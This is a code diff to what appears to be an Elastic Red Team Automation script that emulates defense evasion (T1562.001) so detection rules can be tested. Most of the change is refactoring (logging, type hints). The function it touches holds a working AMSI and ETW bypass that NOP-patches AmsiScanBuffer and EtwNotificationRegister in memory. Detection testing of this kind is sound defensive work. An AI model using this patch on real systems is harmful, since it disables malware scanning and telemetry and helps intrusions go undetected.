@@ -3,7 +3,13 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+import ctypes
+import logging
+import platform
+
+from . import OSType, RuleMetadata, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -18,61 +24,62 @@ from . import _common, RuleMetadata, register_code_rta, OSType
     techniques=["T1562.001"],
 )
 def main():
-    import ctypes, platform
-    from ctypes import windll, wintypes
+    from ctypes import windll, wintypes  # type: ignore
 
-    kernel32 = windll.kernel32
+    kernel32 = windll.kernel32  # type: ignore
 
-    LoadLibraryA = kernel32.LoadLibraryA
-    LoadLibraryA.argtypes = [wintypes.LPCSTR]
-    LoadLibraryA.restype = wintypes.HMODULE
+    LoadLibraryA = kernel32.LoadLibraryA  # type: ignore
+    LoadLibraryA.argtypes = [wintypes.LPCSTR]  # type: ignore
+    LoadLibraryA.restype = wintypes.HMODULE  # type: ignore
 
-    GetProcAddress = kernel32.GetProcAddress
-    GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
-    GetProcAddress.restype = ctypes.c_void_p
+    GetProcAddress = kernel32.GetProcAddress  # type: ignore
+    GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]  # type: ignore
+    GetProcAddress.restype = ctypes.c_void_p  # type: ignore
 
-    VirtualProtect = kernel32.VirtualProtect
-    VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.PDWORD]
-    VirtualProtect.restype = wintypes.BOOL
+    VirtualProtect = kernel32.VirtualProtect  # type: ignore
+    VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.PDWORD]  # type: ignore
+    VirtualProtect.restype = wintypes.BOOL  # type: ignore
 
-    GetCurrentProcess = kernel32.GetCurrentProcess
-    GetCurrentProcess.restype = wintypes.HANDLE
+    GetCurrentProcess = kernel32.GetCurrentProcess  # type: ignore
+    GetCurrentProcess.restype = wintypes.HANDLE  # type: ignore
 
-    WriteProcessMemory = kernel32.WriteProcessMemory
-    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, wintypes.LPVOID]
-    WriteProcessMemory.restype = wintypes.BOOL
+    WriteProcessMemory = kernel32.WriteProcessMemory  # type: ignore
+    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, wintypes.LPVOID]  # type: ignore
+    WriteProcessMemory.restype = wintypes.BOOL  # type: ignore
 
-    GetModuleHandleA = kernel32.GetModuleHandleA
-    GetModuleHandleA.restype = wintypes.HANDLE
-    GetModuleHandleA.argtypes = [wintypes.LPCSTR]
+    GetModuleHandleA = kernel32.GetModuleHandleA  # type: ignore
+    GetModuleHandleA.restype = wintypes.HANDLE  # type: ignore
+    GetModuleHandleA.argtypes = [wintypes.LPCSTR]  # type: ignore
 
     RWX = 0x40  # PAGE_READ_WRITE_EXECUTE
-    OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0))
+    OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0))  # type: ignore
 
-    if platform.architecture()[0] == "64bit":
-        print(f"[+] using x64 based patch")
+    arch = platform.architecture()[0]
+
+    if arch == "64bit":
+        log.info("Using x64 based patch")
         patch = (ctypes.c_char * 6)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
-    if platform.architecture()[0] != "64bit":
-        print(f"[+] using x86 based patch")
+    else:
+        log.info("Using x86 based patch")
         patch = (ctypes.c_char * 8)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
 
-    lib = LoadLibraryA(b"amsi.dll")
+    lib = LoadLibraryA(b"amsi.dll")  # type: ignore
     if lib:
-        print(f"[+] Loaded amsi.dll at {hex(lib)}")
+        log.info(f"Loaded amsi.dll at {hex(lib)}")  # type: ignore
 
-    amsi = GetProcAddress(lib, b"AmsiScanBuffer")
-    etw = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwNotificationRegister")
+    amsi = GetProcAddress(lib, b"AmsiScanBuffer")  # type: ignore
+    etw = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwNotificationRegister")  # type: ignore
     if amsi and etw:
-        print(f"[+] Address of AmsiScanBuffer(): {hex(amsi)}")
-        print(f"[+] Address of EtwEventWrite(): {hex(etw)}")
+        log.info(f"Address of AmsiScanBuffer(): {hex(amsi)}")  # type: ignore
+        log.info(f"Address of EtwEventWrite(): {hex(etw)}")  # type: ignore
 
-    amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
-    etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
+    amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION)  # type: ignore
+    etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION)  # type: ignore
     if amsi_rwx and etw_rwx:
-        print(f"[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX")
+        log.info("Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX")
 
     c_null = ctypes.c_int(0)
-    amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
-    etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
+    amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null))  # type: ignore
+    etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null))  # type: ignore
     if amsi_bypass and etw_bypass:
-        print(f"[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!")
+        log.info("[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!")
